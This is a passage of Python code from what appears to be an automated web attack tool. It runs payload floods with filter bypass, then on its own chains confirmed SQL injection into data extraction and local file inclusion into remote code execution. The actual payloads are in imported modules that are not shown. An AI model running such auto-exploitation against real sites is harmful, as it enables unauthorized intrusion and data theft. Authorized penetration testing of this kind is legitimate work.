                    auto_chain_targets["lfi"].append((url, param))

    # POST body pass — GET jobs above can only hit query-string sinks
    if targets and state.time_left > 5:
        found += await _post_payload_pass(state, targets, payload_types,
                                          bypass,
                                          SmartPayloadGenerator.generate)

    # Run auto-chains AFTER all batches complete (non-blocking)
    if auto_chain_targets["sqli"] and state.time_left > 8:
        for url, param in auto_chain_targets["sqli"][:3]:
            try:
                from modules.web.server_side.sqli_extractor import SQLiExtractor
                extractor = SQLiExtractor(state.async_engine, state.session_manager)
                extracted = await extractor.extract(url, param)
                if extracted:
                    state.extend_findings(extracted)
            except Exception as e:
                w(f"SQLi auto-chain error on {url[:60]}: {str(e)[:60]}")

    if auto_chain_targets["lfi"] and state.time_left > 12:
        for url, param in auto_chain_targets["lfi"][:3]:
            try:
                from modules.web.server_side.lfi_rce_chain import LFItoRCE
                chain = LFItoRCE(state.async_engine, state.session_manager)
                rce_findings = await chain.exploit(url, param)
                if rce_findings:
                    state.extend_findings(rce_findings)
            except Exception as e:
                w(f"LFI→RCE chain error on {url[:60]}: {str(e)[:60]}")

    if found:
        p(f"{G}{found}{N} vulns detected in payload flood wave {state.wave}")
